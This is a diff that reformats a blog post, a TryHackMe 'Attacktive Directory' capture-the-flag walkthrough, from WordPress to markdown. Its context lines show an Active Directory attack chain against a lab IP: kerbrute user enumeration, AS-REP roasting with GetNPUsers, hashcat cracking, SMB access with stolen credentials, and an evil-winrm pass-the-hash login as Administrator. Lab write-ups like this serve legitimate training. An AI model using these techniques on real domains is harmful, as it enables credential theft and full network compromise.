@@ -1,20 +1,5 @@
----
-title: "TryHackMe Attacktive Directory Walkthrough"
-date: "2022-07-21"
-categories: 
-  - "tryhackme-walkthroughs"
-tags: 
-  - "activedirectory"
-  - "cyberchef"
-  - "enum4linux"
-  - "evilwinrm"
-  - "getnpusers"
-  - "hashcat"
-  - "kerberos"
-  - "ntlmhash"
-  - "secretsdump"
-  - "smbclient"
----
+# TryHackMe Attacktive Directory Walkthrough
+
 
 [https://tryhackme.com/room/attacktivedirectory](https://tryhackme.com/room/attacktivedirectory)
 
@@ -163,7 +148,7 @@ Now we're going to enumerate usernames with the provided userlist.txt.
 
 kerbrute userenum ../userlist --dc 10.10.85.196 -d spookysec.local
 
-[![](images/image-27-1024x570.png)](http://localhost/wordpress/wp-content/uploads/2022/07/image-27.png)
+![](images/image-27-1024x570.png)
 
 svc-admin and Administrator look interesting.
 
@@ -173,7 +158,7 @@ GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.85.196
 
 svc-admin TGT was not secured with a password.
 
-[![](images/image-37-1024x157.png)](http://localhost/wordpress/wp-content/uploads/2022/07/image-37.png)
+![](images/image-37-1024x157.png)
 
 Let's try to crack the krb5, type 23, as-rep hash with the provided password list using hashcat.
 
@@ -183,7 +168,7 @@ We have a password!
 
 Next, we'll try to connect to SMB to see what we have access to.
 
-[![](images/image-36-1024x333.png)](http://localhost/wordpress/wp-content/uploads/2022/07/image-36.png)
+![](images/image-36-1024x333.png)
 
 We have access to backup, and there is an interesting text file inside.
 
@@ -192,11 +177,11 @@ smbclient  10.10.85.196\\backup -U spookysec.local/svc-admin%\*\*\*\*\*\*\*\*\*
 mget \*
 y
 
-[![](images/image-35-1024x150.png)](http://localhost/wordpress/wp-content/uploads/2022/07/image-35.png)
+![](images/image-35-1024x150.png)
 
 We'll try to decode the hash using [CyberChef](https://gchq.github.io/CyberChef/)
 
-[![](images/image-34-1024x770.png)](http://localhost/wordpress/wp-content/uploads/2022/07/image-34.png)
+![](images/image-34-1024x770.png)
 
 We have new credentials for backup. backup@spookysec.local:\*\*\*\*\*\*\*\*\*\*
 
@@ -289,6 +274,6 @@ Now, all we have to do is pass the hash using Evil-WinRm to get root access to t
 
 evil-winrm -H 0e0363213e\*\*\*\*\*\*\*\*\*\*0bcb4fc -i 10.10.85.196 -u Administrator
 
-[![](images/image-38-1015x1024.png)](http://localhost/wordpress/wp-content/uploads/2022/07/image-38.png)
+![](images/image-38-1015x1024.png)
 
 With admin access, we can see capture all the flags!
